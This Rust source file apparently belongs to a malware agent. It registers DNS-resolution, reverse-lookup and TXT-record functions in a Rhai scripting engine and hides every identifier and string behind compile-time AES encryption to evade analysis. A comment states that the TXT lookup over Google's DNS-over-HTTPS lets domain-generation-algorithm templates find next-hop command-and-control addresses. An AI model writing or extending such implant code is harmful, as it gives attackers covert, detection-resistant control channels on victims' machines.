// src/agent/scripting/dns.rs
use rhai::Engine;
use std::net::ToSocketAddrs;
use crate::strcrypt_rt;
use strcrypt::aes_str;

pub fn register(engine: &mut Engine) {

    engine.register_fn(&aes_str!("internal_dns_resolve"), |hostname: &str| -> String {
        match format!("{}:80", hostname).to_socket_addrs() {
            Ok(mut it) => it.next().map(|a| a.ip().to_string())
                           .unwrap_or_else(|| aes_str!("Error: empty")),
            Err(e)     => format!("{}{}", aes_str!("Error: "), e),
        }
    });

    engine.register_fn(&aes_str!("internal_dns_resolve_all"), |hostname: &str| -> String {
        match format!("{}:80", hostname).to_socket_addrs() {
            Ok(it) => {
                let ips: Vec<String> = it.map(|a| a.ip().to_string()).collect();
                serde_json::to_string(&ips).unwrap_or("[]".into())
            }
            Err(e) => format!("{}{}", aes_str!("Error: "), e),
        }
    });

    // TXT record lookup via Google DNS-over-HTTPS - no extra dep needed.
    // Used by DGA templates to resolve next-hop C2 addresses from TXT records.
    engine.register_fn(&aes_str!("internal_dns_txt"), |domain: &str| -> String {
        let url = format!("{}{}{}", aes_str!("https://dns.google/resolve?name="), domain, aes_str!("&type=TXT"));
        let body: serde_json::Value = match reqwest::blocking::get(&url)
            .and_then(|r| r.json()) {
            Ok(j)  => j,
            Err(e) => return format!("{}{}", aes_str!("Error: "), e),
        };
        let records: Vec<String> = body[aes_str!("Answer").as_str()].as_array()
            .unwrap_or(&vec![])
            .iter()
            .filter(|a| a[aes_str!("type").as_str()].as_i64() == Some(16))
            .filter_map(|a| a[aes_str!("data").as_str()].as_str())
            .map(|s| s.trim_matches('"').to_string())
            .collect();
        serde_json::to_string(&records).unwrap_or("[]".into())
    });

    engine.register_fn(&aes_str!("internal_dns_reverse"), |ip: &str| -> String {
        let url = format!("{}{}{}", aes_str!("https://dns.google/resolve?name="), ip, aes_str!("&type=PTR"));
        let body: serde_json::Value = match reqwest::blocking::get(&url)
            .and_then(|r| r.json()) {
            Ok(j)  => j,
            Err(e) => return format!("{}{}", aes_str!("Error: "), e),
        };
        body[aes_str!("Answer").as_str()].as_array()
            .and_then(|a| a.first())
            .and_then(|e| e[aes_str!("data").as_str()].as_str())
            .map(|s| s.trim_end_matches('.').to_string())
            .unwrap_or_else(|| aes_str!("No PTR record"))
    });
}